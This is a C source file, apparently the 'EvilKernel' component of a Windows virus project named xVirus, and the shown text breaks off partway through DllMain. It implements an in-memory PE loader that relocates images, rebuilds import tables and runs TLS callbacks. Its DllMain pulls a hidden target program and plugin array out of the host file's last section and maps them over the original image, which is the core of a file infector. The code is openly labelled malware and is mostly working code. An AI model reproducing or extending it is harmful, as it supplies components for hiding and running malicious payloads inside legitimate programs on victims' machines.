#include "EvilKernel.h"
#include "EvilPlugin.h"
#include <Windows.h>
#include "winternl.h"

// 获取DOS头
#define __GetDosHeader__(x)		((PIMAGE_DOS_HEADER)(x))
// 获取NT头
#define __GetNtHeader__(x)		((PIMAGE_NT_HEADERS)((__dword)__GetDosHeader__(x)->e_lfanew + (__dword)(x)))
// 获取首节节表
#define __GetSectionHeader__(x)	IMAGE_FIRST_SECTION(x)
// RVA换VA
#define __RvaToVa__(base,offset) ((__void *)((__dword)(base) + (__dword)(offset)))
// VA换RVA
#define __VaToRva__(base,offset) ((__void *)((__dword)(offset) - (__dword)(base)))

/*
 * 全局变量
 */
XVIRUSDLL_ARG g_xVirusDllArg = {0};
#if defined(__PRINT_DBG_INFO__)
__dword g_dwPrintDbgInfoHandle = 0;
#endif

/*
 * 指定偏移是否在当前节中
 */
__bool __INTERNAL_FUNC__ InThisSection(PIMAGE_SECTION_HEADER pSectH, __offset ofOffset, __bool bRva) {
	return (bRva ? (ofOffset >= (__offset)(pSectH->VirtualAddress)) && (ofOffset < (__offset)(pSectH->VirtualAddress + pSectH->Misc.VirtualSize)) :
		(ofOffset >= (__offset)(pSectH->PointerToRawData)) && (ofOffset < (__offset)(pSectH->PointerToRawData + pSectH->SizeOfRawData)));
}

/*
 * 将偏移转换到所在的节
 */
PIMAGE_SECTION_HEADER __INTERNAL_FUNC__ Rva2Section(__memory pMem, __offset ofRva) {
	PIMAGE_NT_HEADERS pNtH = __GetNtHeader__(pMem);
	PIMAGE_SECTION_HEADER pSectH = __GetSectionHeader__(pNtH);
	__word wNumOfSects = pNtH->FileHeader.NumberOfSections;
	while (wNumOfSects > 0) {
		if (InThisSection(pSectH, ofRva, TRUE))
			break;

		--wNumOfSects;
		++pSectH;
	}

	return (0 == wNumOfSects ? NULL : pSectH);
}

PIMAGE_SECTION_HEADER __INTERNAL_FUNC__ Raw2Section(__memory pMem, __offset ofRaw) {
	PIMAGE_NT_HEADERS pNtH = __GetNtHeader__(pMem);
	PIMAGE_SECTION_HEADER pSectH = __GetSectionHeader__(pNtH);
	__word wNumOfSects = pNtH->FileHeader.NumberOfSections;
	while (wNumOfSects > 0) {
		if (InThisSection(pSectH, ofRaw, FALSE))
			break;

		--wNumOfSects;
		pSectH++;
	}

	return (0 == wNumOfSects ? NULL : pSectH);
}

/*
 * RVA2RAW|RAW2RVA
 */
__offset __INTERNAL_FUNC__ Rva2Raw(__memory pMem, __offset ofRva) {
	PIMAGE_SECTION_HEADER pSectH = Rva2Section(pMem, ofRva);
	return ((NULL == pSectH) ? NULL : (ofRva - pSectH->VirtualAddress + pSectH->PointerToRawData));
}

__offset __INTERNAL_FUNC__ Raw2Rva(__memory pMem, __offset ofRaw) {
	PIMAGE_SECTION_HEADER pSectH = Raw2Section(pMem, ofRaw);
	return ((NULL == pSectH) ? NULL : (ofRaw - pSectH->PointerToRawData + pSectH->VirtualAddress));
}


/*
 * 获取存放宿主代码的节头
 */
PIMAGE_SECTION_HEADER GetTargetSectionHeader(PIMAGE_NT_HEADERS pNtHdr) {
	PIMAGE_SECTION_HEADER pSectionHdr = NULL;
	__word wNumberOfSections = 0;
	wNumberOfSections = pNtHdr->FileHeader.NumberOfSections;
	pSectionHdr = __GetSectionHeader__(pNtHdr) + (wNumberOfSections - 1);
	return pSectionHdr;
}

/*
 * 按照文件映射复制内存
 */
__bool __INTERNAL_FUNC__ CopyMemToMemBySecAlign(__memory pFromMemory, __memory pToMemory, __integer iSizeOfImage) {
	PIMAGE_NT_HEADERS pNt = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	__word wNumberOfSection = 0;
	__integer iHdrLen = 0;
	__integer i = 0;

	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Entry CopyMemToMemBySecAlign\r\n");

	pNt = __GetNtHeader__(pFromMemory);
	pSectionHeader = __GetSectionHeader__(pNt);
	wNumberOfSection = pNt->FileHeader.NumberOfSections;
	iHdrLen = pSectionHeader->PointerToRawData;//获取PE头长度 + 所有节表头长度
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "PE Header Size = ");
	__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)iHdrLen);
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");

	__logic_memset__(pToMemory, 0, iSizeOfImage);//首先将目标映射清除干净
	__logic_memcpy__(pToMemory, pFromMemory, iHdrLen);//复制PE头+节头

	for (i = 0; i < wNumberOfSection; i++) {
		__memory pSecMemAddr, pSecFileAddr;
		__integer iSecSize;
		// 复制节数据
		pSecMemAddr = pToMemory + pSectionHeader->VirtualAddress;
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Current pSectionHeader->VirtualAddress = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)(pSectionHeader->VirtualAddress));
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
		pSecFileAddr = pFromMemory + Rva2Raw(pFromMemory, pSectionHeader->VirtualAddress);
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Current pSectionHeader->PointerToRawData = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)(pSectionHeader->PointerToRawData));
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");

		// 打印当前指针
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Current pSecMemAddr = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pSecMemAddr);
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");

		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Current pSecFileAddr = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pSecFileAddr);
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
		// 打印当前的长度
		iSecSize = pSectionHeader->SizeOfRawData;
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Current pSectionHeader->SizeOfRawData = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)iSecSize);
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
		if (iSecSize != 0) {
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Already __logic_memcpy__(pSecMemAddr, pSecFileAddr, iSecSize)\r\n");
			__logic_memcpy__(pSecMemAddr, pSecFileAddr, iSecSize);
		}
		pSectionHeader++;
	}

	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit CopyMemToMemBySecAlign\r\n");
	return TRUE;
}

/*
 * 检测是否存在指定的数据目录
 */
PIMAGE_DATA_DIRECTORY __INTERNAL_FUNC__ ExistDataDirectory(__memory pMem, __integer iIndex) {
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Entry ExistDataDirectory\r\n");
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Argument iIndex = ");
	__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)iIndex);
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
	
	pNtHeader = __GetNtHeader__(pMem);
	if ((pNtHeader->OptionalHeader).DataDirectory[iIndex].VirtualAddress != 0) {
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "(pNtHeader->OptionalHeader).DataDirectory[iIndex].VirtualAddress = ");
		__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)((pNtHeader->OptionalHeader).DataDirectory[iIndex].VirtualAddress));
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit ExistDataDirectory\r\n");
		return &((pNtHeader->OptionalHeader).DataDirectory[iIndex]);
	}
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit ExistDataDirectory\r\n");
	return NULL;
}

/*
 * 修复引入表
 */
__bool __INTERNAL_FUNC__ RefixIAT(__memory pImageBase) {
	__integer iOrigIatSize = 0;
	__integer iOldProtect = 0;
	__integer iImportAddressTableSize = 0;
	__integer iOldImportAddressTableProtect = 0;
	__integer iSizeOfImage = __GetNtHeader__(pImageBase)->OptionalHeader.SizeOfImage;
	__memory pImportAddressTable = NULL;
	PIMAGE_DATA_DIRECTORY pImportAddressDataDir = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pOrigIatAddress = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDes = NULL;
	PIMAGE_DATA_DIRECTORY pImportDataDir = NULL;
	
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Entry RefixIAT\r\n");
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Argument pImageBase = ");
	__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pImageBase);
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Already ExistDataDirectory(pImageBase, IMAGE_DIRECTORY_ENTRY_IMPORT)\r\n");
	pImportDataDir = ExistDataDirectory(pImageBase, IMAGE_DIRECTORY_ENTRY_IMPORT);//检查是否拥有映入表
	if (!pImportDataDir) {
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "This target is not exist import table\r\n");
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit RefixIAT\r\n");
		return FALSE;
	}

	pOrigIatAddress = (PIMAGE_IMPORT_DESCRIPTOR)(__RvaToVa__(pImageBase, pImportDataDir->VirtualAddress));
	iOrigIatSize = pImportDataDir->Size;

	VirtualProtect((__void *)pOrigIatAddress, iOrigIatSize, PAGE_EXECUTE_READWRITE, &iOldProtect);
	// 这里将位于数据目录12索引的引入地址表的地址也设置为可写,如果存在这个表那么地址表真正在此处
	pImportAddressDataDir = ExistDataDirectory(pImageBase, IMAGE_DIRECTORY_ENTRY_IAT);
	if (pImportAddressDataDir) {
		pImportAddressTable = (__memory)__RvaToVa__(pImageBase, pImportAddressDataDir->VirtualAddress);
		iImportAddressTableSize = pImportAddressDataDir->Size;
		VirtualProtect((__void *)pImportAddressTable, iImportAddressTableSize, PAGE_EXECUTE_READWRITE, &iOldImportAddressTableProtect);
	}

	pImportDes = (PIMAGE_IMPORT_DESCRIPTOR)__RvaToVa__(pImageBase, pImportDataDir->VirtualAddress);

	// 有些程序只适用FirstThunk
	while ((pImportDes->OriginalFirstThunk) || (pImportDes->FirstThunk)) {
		__char *svDllName = (__char *)__RvaToVa__(pImageBase, pImportDes->Name);
		HMODULE hDll = NULL;
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Load dll = ");
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, svDllName);
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
		hDll = GetModuleHandleA((__char *)svDllName);//映射库到地址空间
		if(!hDll) hDll = LoadLibraryA((LPCSTR)svDllName);
		if(!hDll) {
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit RefixIAT\r\n");
			return FALSE;
		}

		if (pImportDes->TimeDateStamp == 0 || TRUE) {
			PIMAGE_THUNK_DATA pTdIn, pTdOut;
			pImportDes->ForwarderChain = (__integer)hDll;
			pImportDes->TimeDateStamp = 0xCDC31337; // This is bullshit cuz I don't want to call libc.

			// 填充引入表地址
			if (pImportDes->OriginalFirstThunk == 0)//如果此字段为0,则使用FirstThunk
				pTdIn = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->FirstThunk);
			else
				pTdIn = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->OriginalFirstThunk);
			pTdOut = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->FirstThunk);

			while(pTdIn->u1.Function) {
				FARPROC pFunc;

				// 以序号引出还是以函数名引出
				if (pTdIn->u1.Ordinal & IMAGE_ORDINAL_FLAG32) {
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "GetProcAddress by Ordinal = ");
					__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, pTdIn->u1.Ordinal);
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
					pFunc = GetProcAddress(hDll, (__char *)MAKEINTRESOURCE(pTdIn->u1.Ordinal));//序号引出
				} else {
					// 函数名引出
					PIMAGE_IMPORT_BY_NAME pIbn;
					pIbn = (PIMAGE_IMPORT_BY_NAME)__RvaToVa__(pImageBase, pTdIn->u1.AddressOfData);
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "GetProcAddress by Name = ");
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, pIbn->Name);
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
					pFunc = GetProcAddress(hDll, (__char *)pIbn->Name);
				}
				if (!pFunc) {
					__dword dwGetProcAddressError = 0;
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Invoke GetProcAddress failed\r\n");
					dwGetProcAddressError = GetLastError();
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "GetProcAddress last error = ");
					__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, dwGetProcAddressError);
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit RefixIAT\r\n");
					return FALSE;
				}

				// 检验地址是否是中间跳转
				//if (((__memory)pFunc < (__memory)pImageBase) || ((__memory)pFunc >= (__memory)pImageBase + iSizeOfImage)) {
				//	 重新获取地址
				//	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "The Address is other import library\r\n");
				//}

				// 获取成功
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\tImport Table Address = ");
				__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)(pTdOut));
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\tProcedure Address = ");
				__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pFunc);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
				pTdOut->u1.Function = (__dword)pFunc;
				pTdIn++;
				pTdOut++;
			}/* end while */
		}/* end if */
		// 下一个DLL
		pImportDes++;
	}/* end while */

	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit RefixIAT\r\n");
	return TRUE;
}

#include "RefixTlsPrivate.c"
__bool __INTERNAL_FUNC__ RefixTLS(__memory pImageBase, __bool bDetach) {
	if (ResetTlsTable() == 0) return TRUE;//遍历所有以加载库,并统计TLS的长度
	if (InitializeTlsForProccess() == FALSE) return FALSE;//初始化TLS表
	if (InitializeTlsForThread() == FALSE) return FALSE;//初始化第一条线程
	if (bDetach == TRUE)
		TlsCallback(DLL_PROCESS_DETACH);//运行TLS回调函数
	else
		TlsCallback(DLL_PROCESS_ATTACH);//运行TLS回调函数
	return TRUE;
}

// 重定位所需结构
#pragma pack(push,1)
// 修复入口
typedef struct _IMAGE_FIXUP_ENTRY {
	__word offset:12;
	__word type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;
// 重定位块
typedef struct _IMAGE_FIXUP_BLOCK {
	__dword dwPageRVA;
	__dword dwBlockSize;
} IMAGE_FIXUP_BLOCK, *PIMAGE_FIXUP_BLOCK;
#pragma pack(pop)
__bool __INTERNAL_FUNC__ BaseRelocation(__memory pMem, __address addrOldImageBase, __address addrNewImageBase, __bool bIsInFile) {
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	__offset delta = (__offset)(addrNewImageBase - addrOldImageBase);
	__integer *pFixAddRhi = NULL;
	__bool bHaveFixAddRhi = FALSE;
	__integer iRelocSize = 0;

	pNtHdr = __GetNtHeader__(pMem);
	iRelocSize = pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	if ((delta) && (iRelocSize)) {
		PIMAGE_FIXUP_BLOCK pStartFB = NULL;
		PIMAGE_FIXUP_BLOCK pIBR = NULL;
		if (bIsInFile) {
			__integer iRelocRaw = Rva2Raw(pMem, pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			pIBR = (PIMAGE_FIXUP_BLOCK)(pMem + iRelocRaw);
		} else {
			pIBR = (PIMAGE_FIXUP_BLOCK)__RvaToVa__(addrNewImageBase, pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		}
		pStartFB = pIBR;

		// 遍历每个重定位块
		while ((__integer)(pIBR - pStartFB) < iRelocSize) {
			PIMAGE_FIXUP_ENTRY pFE;
			__integer i, iCount = 0;
			if (pIBR->dwBlockSize > 0) {
				iCount=(pIBR->dwBlockSize - sizeof(IMAGE_FIXUP_BLOCK)) / sizeof(IMAGE_FIXUP_ENTRY);
				pFE = (PIMAGE_FIXUP_ENTRY)(((__memory)pIBR) + sizeof(IMAGE_FIXUP_BLOCK));
			} else {
				//pIBR = (PIMAGE_FIXUP_BLOCK)(((__memory)pIBR) + sizeof(IMAGE_FIXUP_BLOCK));		
				//continue;
				break;
			}

			// 修复每个入口
			for (i = 0; i < iCount; i++) {
				__memory pFixAddr = NULL;
				if (bIsInFile) {//如果在文件中
					__offset ofRva = pIBR->dwPageRVA + pFE->offset;
					__offset ofRaw = Rva2Raw(pMem, ofRva);
					pFixAddr = pMem + ofRaw;
				} else {//如果在内存中
					pFixAddr = __RvaToVa__(addrNewImageBase, pIBR->dwPageRVA + pFE->offset);
				}

				switch (pFE->type)
				{
#if defined(_X86_)
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGH:
					*((__sword *)pFixAddr) += (__sword)HIWORD(delta);
					break;
				case IMAGE_REL_BASED_LOW:
					*((__sword *)pFixAddr) += (__sword)LOWORD(delta);
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*((__sdword *)pFixAddr) += (__sdword)delta;
					break;
				case IMAGE_REL_BASED_HIGHADJ: // This one's really fucked up.
					{
						__dword dwAdjust;					
						dwAdjust = ((*((__word *)pFixAddr)) << 16) | (*(__word *)(pFE + 1));
						(__sdword)dwAdjust += (__sdword)delta;
						dwAdjust += 0x00008000;
						*((__word *)pFixAddr) = HIWORD(dwAdjust);
					}
					pFE++;
					break;
#endif
				default:
					return FALSE;
				}/* end switch */
				pFE++;
			}/* end for */

			pIBR = (PIMAGE_FIXUP_BLOCK)((__memory)pIBR + pIBR->dwBlockSize);
		}/* end while */
	}
	return TRUE;
}

/*
 * PE加载器
 */
typedef __bool (__API__ *FPDllMain)(__dword hModule, __dword ul_reason_for_call, __memory lpReserved);
FPDllMain __INTERNAL_FUNC__ LoadPlugin(__memory pLoadCode, __memory pOutMemory, __integer iOutMemorySize) {
	FPDllMain pEntryFunction = NULL;
	__address addrOldImageBase = 0;
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	__dword dwOldProtected = 0;
	__dword dwSizeOfImage = 0;

	pNtHdr = __GetNtHeader__(pLoadCode);
	dwSizeOfImage = pNtHdr->OptionalHeader.SizeOfImage;
	if (dwSizeOfImage > iOutMemorySize)//尺寸不合适
		return NULL;

	VirtualProtect(pOutMemory, dwSizeOfImage, PAGE_EXECUTE_READWRITE, &dwOldProtected);//修改内存权限
	if (CopyMemToMemBySecAlign(pLoadCode, pOutMemory, dwSizeOfImage) == FALSE) return FALSE;//复制到内存

	// 修复重定位表
	addrOldImageBase = pNtHdr->OptionalHeader.ImageBase;
	if (!BaseRelocation(pOutMemory, addrOldImageBase, (__address)pOutMemory, FALSE))
		return FALSE;

	// 修复输入表
	if (!RefixIAT(pOutMemory))
		return NULL;

	/*
	 * 取得入口点函数
	 */
	pNtHdr = __GetNtHeader__(pOutMemory);
	pEntryFunction = (FPDllMain)(pOutMemory + pNtHdr->OptionalHeader.AddressOfEntryPoint);
	return pEntryFunction;
}

/*
 * 获取函数地址
 */
FARPROC __INTERNAL_FUNC__ xGetProcAddressImmediately(HMODULE hDll, __char *pFuncName) {
	__word wOrdinal = 0;
	__integer iDirCount = 0;
	__address *pAddrTable = NULL;
	__address addrAddr = 0;
	__offset ofRVA = 0;
	__integer iExpDataSize = 0;
	PIMAGE_EXPORT_DIRECTORY pEd = NULL;
	PIMAGE_NT_HEADERS pNt = NULL;
	PIMAGE_DATA_DIRECTORY pExportDataDirectory = NULL;
	if (hDll == NULL) return NULL;
	pNt = __GetNtHeader__((__memory)hDll);
	iDirCount = pNt->OptionalHeader.NumberOfRvaAndSizes;
	if (iDirCount < IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return FALSE;
	pExportDataDirectory = ExistDataDirectory((__memory)hDll, IMAGE_DIRECTORY_ENTRY_EXPORT);
	if(!pExportDataDirectory) 
		return NULL;//确定引出表
	iExpDataSize = pExportDataDirectory->Size;
	// 从引出表获取函数地址
	pEd = (PIMAGE_EXPORT_DIRECTORY)__RvaToVa__(hDll, pExportDataDirectory->VirtualAddress);	
	/* 
	 * 获取序数引出的函数
	 */
	if (HIWORD((__dword)pFuncName)==0) {//以序号引出
		wOrdinal = (__word)(LOWORD((__dword)pFuncName)) - pEd->Base;
	} else {
		__integer i, iCount;
		__dword *pdwNamePtr;
		__word *pwOrdinalPtr;

		iCount = (__integer)(pEd->NumberOfNames);
		pdwNamePtr = (__dword *)__RvaToVa__(hDll, pEd->AddressOfNames);
		pwOrdinalPtr = (__word *)__RvaToVa__(hDll, pEd->AddressOfNameOrdinals);

		for(i = 0; i < iCount; i++) {
			__char *svName = NULL;
			svName = (__char *)__RvaToVa__(hDll, *pdwNamePtr);
			if (__logic_strcmp__(svName, pFuncName) == 0) {
				wOrdinal = *pwOrdinalPtr;
				break;
			}
			pdwNamePtr++;
			pwOrdinalPtr++;
		}
		if (i == iCount) return NULL;
	}

	pAddrTable=(__address *)__RvaToVa__(hDll, pEd->AddressOfFunctions);
	ofRVA = pAddrTable[wOrdinal];
	addrAddr = (__address)__RvaToVa__(hDll, ofRVA);
	/*
	 * 最终判断是否是中间跳转
	 */
	if (((__address)addrAddr >= (__address)pEd) &&
		((__address)addrAddr < (__address)pEd + (__address)iExpDataSize))
		return NULL;
	return (FARPROC)addrAddr;
}

/*
 * 以节的长度获取映射大小
 */
__integer __INTERNAL_FUNC__ GetRealPeFileSize(__memory pMem) {
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	PIMAGE_SECTION_HEADER pFirstSectionHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	__integer iRet = 0;
	__word wSectionNumber = 0;
	__integer i = 0;

	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Entry GetRealPeFileSize\r\n");
	pNtHdr = __GetNtHeader__(pMem);
	wSectionNumber = pNtHdr->FileHeader.NumberOfSections;
	pFirstSectionHeader = pSectionHeader = __GetSectionHeader__(pNtHdr);
	iRet = pFirstSectionHeader->PointerToRawData;//获取整个PE头的大小
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "All PE Header Size = ");
	__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, iRet);
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
	for (i = 0; i < wSectionNumber; i++) {
		// 这里核算所有节的文件大小总和
		iRet += (pSectionHeader->SizeOfRawData);
		pSectionHeader++;
	}
	__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Exit GetRealPeFileSize\r\n");
	return iRet;
}

/*
 * 新节结构
 * 配置结构
 * 目标程序
 * 各类插件
 */
#include "..\Common\xVirusCrypto.c"
typedef __void (__API__ *FPOrigEntryAddress)();

// 以下全局变量只在DllMain中使用,辅助恢复运行环境
__dword g_dwOrigEsp = 0;
__dword g_dwOrigEbp = 0;
__dword g_dwOrigEsi = 0;
__dword g_dwOrigEdi = 0;
__dword g_dwOrigEbx = 0;
__dword g_dwOrigEdx = 0;
__dword g_dwOrigEcx = 0;
__address g_addrOrigDllMain = 0;
__bool __API__ DllMain(__dword hModule, __dword ul_reason_for_call, PXVIRUSDLL_ARG pArg) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		return TRUE;
	}
	/*
	 * 这里开始是邪恶核心的主要代码,负责
	 * 从末尾节读出目标程序,并使用PE LOADER
	 * 加载到内存
	 */
	{
		__memory pMem = NULL;
		PIMAGE_NT_HEADERS pNtHdr = NULL;
		PIMAGE_SECTION_HEADER pTargetSectionHdr = NULL;
		PEVILKERNEL_CONFIGURE pEvilKernelConfigure = NULL;
		__memory pTarget = NULL;
		__memory pPluginArray = NULL;
		__dword dwOldProtected = 0;

#if defined(__PRINT_DBG_INFO__)
		// 开启调试文件记录
		g_dwPrintDbgInfoHandle = __PrintDbgInfo_RecordToFileInit__("EvilKernelLog.txt");
#endif
		
		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Get basic information\r\n");
		// 如果pArg不为空则复制
		if (pArg)
			__logic_memcpy__(&g_xVirusDllArg, pArg, sizeof(XVIRUSDLL_ARG));
		pMem = (__memory)hModule;
		pNtHdr = __GetNtHeader__(pMem);
		pTargetSectionHdr = GetTargetSectionHeader(pNtHdr);
		pEvilKernelConfigure = (PEVILKERNEL_CONFIGURE)(pMem + pTargetSectionHdr->VirtualAddress);
		pTarget = pMem + pTargetSectionHdr->VirtualAddress + sizeof(EVILKERNEL_CONFIGURE);
		pPluginArray = (__memory)(pTarget + pEvilKernelConfigure->iTargetFileSize);

		__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Map target dll to orig map address\r\n");
		{
			// 映射目标程序到原始的映射
			__memory pOrigImageBase = NULL;
			PIMAGE_NT_HEADERS pTargetNtHdr = NULL;
			__integer iTargetImageSize = 0;
			__address addrOldImageBase = 0;

			if (pEvilKernelConfigure->bIsDll) {
				pOrigImageBase = (__memory)(g_xVirusDllArg.addrOrigImageBase);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "It is dll image base = ");
				__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)pOrigImageBase);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
			} else
				pOrigImageBase = (__memory)GetModuleHandle(NULL);
			pTargetNtHdr = __GetNtHeader__(pTarget);
			iTargetImageSize = pTargetNtHdr->OptionalHeader.SizeOfImage;
			
			{
				__memory pTargetBuffer = NULL;
				__integer iTargetBufferSize = 0;
				__integer iTargetRealSize = 0;

				iTargetRealSize = pEvilKernelConfigure->iTargetFileSize;
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "iTarget File Size = ");
				__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)iTargetRealSize);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");
				iTargetBufferSize = GetRealPeFileSize(pTarget);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "iTarget Real File Size = ");
				__PrintDbgInfo_RecordIntegerToFile__(g_dwPrintDbgInfoHandle, (__dword)iTargetBufferSize);
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "\r\n");

				if (iTargetBufferSize < iTargetRealSize) {
					iTargetBufferSize = iTargetRealSize;
					__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Use iTarget File Size as Buffer Size\r\n");
				}
				pTargetBuffer = (__memory)__logic_new_size__(iTargetBufferSize);
				__logic_memcpy__(pTargetBuffer, pTarget, iTargetRealSize);

				// 复制内存
				VirtualProtect(pOrigImageBase, iTargetImageSize, PAGE_EXECUTE_READWRITE, &dwOldProtected);//修改内存权限
				__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Already CopyMemToMemBySecAlign(pTargetBuffer, pOrigImageBase, iTargetImageSize)\r\n");
				if (!CopyMemToMemBySecAlign(pTargetBuffer, pOrigImageBase, iTargetImageSize)) {
					__logic_delete__(pTargetBuffer);
					return FALSE;
				}
				__logic_delete__(pTargetBuffer);
			}

			// 进行重定位
			addrOldImageBase = pTargetNtHdr->OptionalHeader.ImageBase;
			__PrintDbgInfo_RecordStringToFile__(g_dwPrintDbgInfoHandle, "Old ImageBase = ");
